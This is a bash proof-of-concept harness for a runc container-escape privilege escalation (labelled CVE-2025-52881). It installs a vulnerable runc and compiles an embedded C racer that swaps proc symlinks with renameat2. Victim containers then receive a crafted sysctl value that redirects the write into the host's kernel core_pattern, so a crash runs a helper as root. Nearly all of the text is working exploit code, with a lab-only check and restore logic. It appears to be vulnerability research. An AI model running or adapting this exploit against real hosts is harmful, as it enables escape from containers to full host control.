#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
WORK_DIR="${WORK_DIR:-$SCRIPT_DIR}"
if [ -z "${SETUP_SCRIPT:-}" ]; then
  if [ -x "$WORK_DIR/poc-docker-setup.sh" ]; then
    SETUP_SCRIPT="$WORK_DIR/poc-docker-setup.sh"
  else
    SETUP_SCRIPT="$WORK_DIR/poc-setup.sh"
  fi
fi

STATE_DIR="${STATE_DIR:-/tmp/sg-2026-0004-lpe}"
DOCKERD_LOG="${DOCKERD_LOG:-$STATE_DIR/dockerd.log}"
DOCKER_HOST="${DOCKER_HOST:-unix:///var/run/docker.sock}"

detect_runc_arch() {
  case "$(uname -m)" in
    x86_64|amd64) echo amd64 ;;
    aarch64|arm64) echo arm64 ;;
    armv7l|armhf) echo armhf ;;
    ppc64le) echo ppc64le ;;
    s390x) echo s390x ;;
    *) echo amd64 ;;
  esac
}

RUNC_ARCH="${RUNC_ARCH:-$(detect_runc_arch)}"
RUNC_VULN="${RUNC_VULN:-$WORK_DIR/bin/runc-v1.2.7.$RUNC_ARCH}"
SYSTEM_RUNC="${SYSTEM_RUNC:-/usr/bin/runc}"
RUNC_INSTALL_PATHS="${RUNC_INSTALL_PATHS:-/usr/bin/runc /usr/sbin/runc}"
IMAGE="${IMAGE:-alpine:3.20}"
ATTEMPTS="${ATTEMPTS:-80}"
START_DOCKERD="${START_DOCKERD:-1}"
RUN_SETUP="${RUN_SETUP:-1}"
KEEP_TMP="${KEEP_TMP:-0}"
RESTORE_CORE_PATTERN="${RESTORE_CORE_PATTERN:-1}"
HELPER_SRC="${HELPER_SRC:-$WORK_DIR/escape-helper.c}"
HELPER_BIN="${HELPER_BIN:-/tmp/cve52881_core_helper}"
ESCAPE_TMP_DIR="${ESCAPE_TMP_DIR:-$STATE_DIR/escape-tmp}"
CALLBACK_FIFO="${CALLBACK_FIFO:-$ESCAPE_TMP_DIR/core-helper-output.fifo}"
CALLBACK_PID=""
ESCAPE_CORE_PATTERN=""
ORIGINAL_CORE_PATTERN=""

usage() {
  cat <<EOF
Usage: $0 [options]

Options:
  --attempts N       Victim docker-run attempts. Default: $ATTEMPTS
  --image NAME       Victim/racer image. Default: $IMAGE
  --no-setup         Do not invoke setup when the vulnerable runc binary is missing.
  --keep-tmp         Keep temporary state under /tmp after exit.
  --no-restore       Leave core_pattern as observed at exit. Not recommended.
  -h, --help         Show this help.

This is the host-control impact LPE harness for CVE-2025-52881.
It uses Docker's normal run path, no OCI hooks, and official vulnerable runc.
It prints results to the console only and does not save result artifacts.
EOF
}

while [ "$#" -gt 0 ]; do
  case "$1" in
    --attempts)
      ATTEMPTS="$2"
      shift 2
      ;;
    --image)
      IMAGE="$2"
      shift 2
      ;;
    --no-setup)
      RUN_SETUP=0
      shift
      ;;
    --keep-tmp)
      KEEP_TMP=1
      shift
      ;;
    --no-restore)
      RESTORE_CORE_PATTERN=0
      shift
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      echo "[-] Unknown option: $1" >&2
      usage >&2
      exit 2
      ;;
  esac
done

log() { printf '[*] %s\n' "$*"; }
ok() { printf '[+] %s\n' "$*"; }
die() { printf '[-] %s\n' "$*" >&2; exit 1; }

require_lab() {
  if [ "${ALLOW_NON_DIND:-0}" = "1" ]; then
    return
  fi
  if [ -f /.dockerenv ]; then
    return
  fi
  if grep -qaE 'docker|containerd|kubepods|libpod' /proc/1/cgroup 2>/dev/null; then
    return
  fi
  die "Refusing to run outside an apparent container lab. Set ALLOW_NON_DIND=1 to override."
}

require_root_and_core_pattern() {
  [ "$(id -u)" = "0" ] || die "Must run as root in the privileged Docker/VM lab."
  [ -w /proc/sys/kernel/core_pattern ] || die "/proc/sys/kernel/core_pattern is not writable. Use a privileged lab container or disposable VM."
}

read_core_pattern() {
  cat /proc/sys/kernel/core_pattern
}

restore_core_pattern() {
  if [ "$RESTORE_CORE_PATTERN" = "1" ] && [ -n "$ORIGINAL_CORE_PATTERN" ]; then
    printf '%s' "$ORIGINAL_CORE_PATTERN" >/proc/sys/kernel/core_pattern || true
  fi
}

cleanup_containers() {
  docker rm -f sg-2026-0004-racer sg-2026-0004-crash >/dev/null 2>&1 || true
  docker ps -aq --filter 'name=sg-2026-0004-victim-' | xargs -r docker rm -f >/dev/null 2>&1 || true
}

cleanup_state() {
  cleanup_containers || true
  if [ -n "$CALLBACK_PID" ]; then
    kill "$CALLBACK_PID" >/dev/null 2>&1 || true
  fi
  restore_core_pattern
  rm -f "$HELPER_BIN" >/dev/null 2>&1 || true
  if [ "$KEEP_TMP" != "1" ]; then
    rm -rf "$STATE_DIR"
  fi
}

ensure_vulnerable_runc() {
  if [ -x "$RUNC_VULN" ]; then
    ok "Vulnerable runc binary found: $RUNC_VULN"
    return
  fi
  [ "$RUN_SETUP" = "1" ] || die "Missing vulnerable runc binary: $RUNC_VULN"
  [ -x "$SETUP_SCRIPT" ] || die "Missing setup script: $SETUP_SCRIPT"
  log "Vulnerable runc binary missing. Running vulnerable-only setup..."
  SETUP_FIXED=0 "$SETUP_SCRIPT"
  [ -x "$RUNC_VULN" ] || die "Setup finished but vulnerable runc is still missing: $RUNC_VULN"
}

install_vulnerable_runc() {
  log "Installing vulnerable runc into Docker runtime paths..."
  for path in $RUNC_INSTALL_PATHS; do
    mkdir -p "$(dirname "$path")"
    cp "$RUNC_VULN" "$path"
    chmod 0755 "$path"
    ok "Installed $path"
  done
  ok "Runtime runc version:"
  "$SYSTEM_RUNC" --version | sed 's/^/    /'
}

stop_dockerd() {
  export DOCKER_HOST
  if docker info >/dev/null 2>&1; then
    cleanup_containers || true
  fi
  pkill -TERM dockerd >/dev/null 2>&1 || true
  pkill -TERM containerd >/dev/null 2>&1 || true
  for _ in $(seq 1 20); do
    if ! pgrep -x dockerd >/dev/null 2>&1 && ! pgrep -x containerd >/dev/null 2>&1; then
      return
    fi
    sleep 0.2
  done
  pkill -KILL dockerd >/dev/null 2>&1 || true
  pkill -KILL containerd >/dev/null 2>&1 || true
}

start_dockerd() {
  export DOCKER_HOST
  if docker info >/dev/null 2>&1; then
    ok "Nested Docker daemon is already reachable"
    return
  fi
  [ "$START_DOCKERD" = "1" ] || die "Docker daemon is not reachable and START_DOCKERD=0"
  log "Starting nested Docker daemon..."
  mkdir -p /var/run /var/lib/docker "$STATE_DIR"
  dockerd --host="$DOCKER_HOST" --storage-driver=vfs >"$DOCKERD_LOG" 2>&1 &
  for _ in $(seq 1 90); do
    if docker info >/dev/null 2>&1; then
      ok "Nested Docker daemon is ready"
      return
    fi
    sleep 1
  done
  sed -n '1,160p' "$DOCKERD_LOG" >&2 || true
  die "Nested Docker daemon did not become ready"
}

write_racer_source() {
  mkdir -p "$STATE_DIR"
  cat >"$STATE_DIR/racer.c" <<'EOF'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

static volatile sig_atomic_t keep_running = 1;
static void stop(int sig) { (void)sig; keep_running = 0; }
static int xrename_exchange(const char *a, const char *b) {
  return (int)syscall(SYS_renameat2, AT_FDCWD, a, AT_FDCWD, b, RENAME_EXCHANGE);
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s /race\n", argv[0]);
    return 2;
  }
  if (chdir(argv[1]) != 0) {
    perror("chdir");
    return 2;
  }
  signal(SIGTERM, stop);
  signal(SIGINT, stop);
  while (keep_running) {
    if (xrename_exchange("proc", "proc.swap") != 0) {
      if (errno == ENOSYS || errno == EINVAL) {
        fprintf(stderr, "renameat2(RENAME_EXCHANGE) unavailable: %s\n", strerror(errno));
        return 3;
      }
    }
    sched_yield();
  }
  return 0;
}
EOF
}

build_racer() {
  write_racer_source
  log "Building racer helper..."
  if gcc -O2 -static -o "$STATE_DIR/racer" "$STATE_DIR/racer.c" >/dev/null 2>&1; then
    :
  else
    gcc -O2 -o "$STATE_DIR/racer" "$STATE_DIR/racer.c" >/dev/null
  fi
  chmod 0755 "$STATE_DIR/racer"
  ok "Racer helper built"
}

build_escape_helper() {
  [ -r "$HELPER_SRC" ] || die "Missing escape helper source: $HELPER_SRC"
  mkdir -p "$(dirname "$HELPER_BIN")" "$ESCAPE_TMP_DIR"

  local cc_bin
  cc_bin="$(command -v gcc || command -v cc || true)"
  [ -n "$cc_bin" ] || die "gcc or cc is required to build escape helper"

  log "Building core_pattern pipe helper..."
  "$cc_bin" -O2 -Wall -Wextra -static -s -o "$HELPER_BIN" "$HELPER_SRC" >/dev/null
  chmod 0755 "$HELPER_BIN"
  cp "$HELPER_BIN" "$ESCAPE_TMP_DIR/$(basename "$HELPER_BIN")"
  chmod 0755 "$ESCAPE_TMP_DIR/$(basename "$HELPER_BIN")"

  ESCAPE_CORE_PATTERN="|/proc/%P/root$HELPER_BIN %P %u %g %s %e"
  if [ "${#ESCAPE_CORE_PATTERN}" -gt 127 ]; then
    die "core_pattern payload is too long (${#ESCAPE_CORE_PATTERN} bytes): $ESCAPE_CORE_PATTERN"
  fi
  ok "Helper built: $HELPER_BIN"
  ok "core_pattern payload: $ESCAPE_CORE_PATTERN"
}

start_callback_reader() {
  command -v timeout >/dev/null 2>&1 || die "timeout command is required"

  rm -f "$CALLBACK_FIFO"
  mkfifo "$CALLBACK_FIFO"
  printf 'fifo:///tmp/%s\n' "$(basename "$CALLBACK_FIFO")" >"$ESCAPE_TMP_DIR/endpoint"

  log "Starting console callback reader through FIFO: /tmp/$(basename "$CALLBACK_FIFO")"
  timeout 15 cat "$CALLBACK_FIFO" &
  CALLBACK_PID="$!"
  sleep 0.2

  if ! kill -0 "$CALLBACK_PID" >/dev/null 2>&1; then
    CALLBACK_PID=""
    die "Console callback reader failed to start"
  fi
}

prepare_race_dirs() {
  local root="$1"
  local shared="$root/shared"
  local payload="$root/payload"

  rm -rf "$root"
  mkdir -p "$shared/safe/sys/net/ipv4" "$payload"
  ln -s safe "$shared/proc"
  ln -s /proc "$shared/proc.swap"
  ln -s /proc/sys/kernel/core_pattern "$payload/ping_group_range"

  printf '%s\n' "$shared"
  printf '%s\n' "$payload"
}

start_racer_container() {
  local shared="$1"
  cleanup_containers
  docker run -d \
    --name sg-2026-0004-racer \
    --rm \
    --mount "type=bind,src=$shared,dst=/race" \
    --mount "type=bind,src=$STATE_DIR/racer,dst=/racer,readonly" \
    "$IMAGE" /racer /race >/dev/null

  sleep 1
  docker ps --format '{{.Names}}' | grep -qx 'sg-2026-0004-racer' || die "Racer container exited unexpectedly"
  ok "Racer container is running"
}

run_redirect_race() {
  local state_root="$STATE_DIR/trial"
  local dirs shared payload victim_name current hit_attempt=0 observed_attempts=0

  log "Preparing shared race directory..."
  mapfile -t dirs < <(prepare_race_dirs "$state_root")
  shared="${dirs[0]}"
  payload="${dirs[1]}"
  ok "Shared source: $shared"
  ok "Payload source: $payload"
  ok "Redirect target: /proc/sys/kernel/core_pattern"
  ok "Victim sysctl key: net.ipv4.ping_group_range"

  log "Starting racer container..."
  start_racer_container "$shared"

  log "Launching victim containers until core_pattern is redirected to the pipe helper..."
  for attempt in $(seq 1 "$ATTEMPTS"); do
    victim_name="sg-2026-0004-victim-${attempt}"
    set +e
    docker run --rm \
      --name "$victim_name" \
      --mount "type=bind,src=$shared,dst=/race" \
      --mount "type=bind,src=$payload,dst=/race/proc/sys/net/ipv4" \
      --sysctl "net.ipv4.ping_group_range=$ESCAPE_CORE_PATTERN" \
      "$IMAGE" true >/dev/null 2>&1
    set -e

    current="$(read_core_pattern)"
    docker rm -f "$victim_name" >/dev/null 2>&1 || true
    observed_attempts="$attempt"

    if [ "$current" = "$ESCAPE_CORE_PATTERN" ]; then
      hit_attempt="$attempt"
      break
    fi

    if [ "$((attempt % 10))" -eq 0 ]; then
      log "Attempts completed: $attempt / $ATTEMPTS"
    fi
  done

  docker rm -f sg-2026-0004-racer >/dev/null 2>&1 || true
  [ "$hit_attempt" -gt 0 ] || die "core_pattern redirect was not observed after $ATTEMPTS attempts"

  local single_run_rate retry_window_rate
  single_run_rate="$(awk -v hit="$hit_attempt" 'BEGIN { printf "%.2f", 100.0 / hit }')"
  retry_window_rate="$(awk -v hit="$hit_attempt" -v attempts="$ATTEMPTS" 'BEGIN { p = 1.0 / hit; printf "%.2f", (1.0 - exp(attempts * log(1.0 - p))) * 100.0 }')"

  echo
  ok "core_pattern redirect observed"
  ok "Hit attempt: $hit_attempt"
  ok "Observed attempts: $observed_attempts"
  ok "Observed single-run success rate: ${single_run_rate}% (1 hit / ${hit_attempt} attempts)"
  ok "Estimated success probability for $ATTEMPTS attempts: ${retry_window_rate}%"
}

trigger_container_crash() {
  echo
  ok "Waiting for core_pattern helper callback"
  log "Triggering a crash in a container to invoke the redirected core_pattern helper..."
  docker rm -f sg-2026-0004-crash >/dev/null 2>&1 || true
  docker run --rm \
    --name sg-2026-0004-crash \
    --mount "type=bind,src=$ESCAPE_TMP_DIR,dst=/tmp" \
    "$IMAGE" sh -c 'ulimit -c unlimited 2>/dev/null || true; sh -c "kill -SEGV \$\$"; sleep 1' \
    >/dev/null 2>&1 || true

  if wait "$CALLBACK_PID"; then
    CALLBACK_PID=""
    echo
    ok "core_pattern helper executed"
    return 0
  fi
  CALLBACK_PID=""
  die "core_pattern was redirected, but the helper callback was not received"
}

main() {
  echo "=== SG-2026-0004 LPE: CVE-2025-52881 host-control impact ==="
  echo "=== Console-only output, no saved artifacts ==="
  echo
  log "Target: /proc/sys/kernel/core_pattern"
  log "Primitive: runc sysctl procfs write redirection"
  log "Impact: core_pattern pipe helper execution as uid=0"
  echo

  require_lab
  require_root_and_core_pattern
  rm -rf "$STATE_DIR"
  mkdir -p "$STATE_DIR"
  ORIGINAL_CORE_PATTERN="$(read_core_pattern)"
  trap cleanup_state EXIT

  log "Original core_pattern: $ORIGINAL_CORE_PATTERN"
  ensure_vulnerable_runc
  install_vulnerable_runc
  stop_dockerd
  start_dockerd
  log "Pulling Docker image: $IMAGE"
  docker pull "$IMAGE" >/dev/null
  ok "Image ready: $IMAGE"
  build_racer
  build_escape_helper

  if [ "$ORIGINAL_CORE_PATTERN" = "$ESCAPE_CORE_PATTERN" ]; then
    die "core_pattern already equals the LPE payload; restore it before testing"
  fi

  run_redirect_race
  start_callback_reader
  trigger_container_crash
  restore_core_pattern

  echo
  ok "EXPLOIT SUCCESSFUL"
  ok "Final core_pattern: $(read_core_pattern)"
}

main "$@"
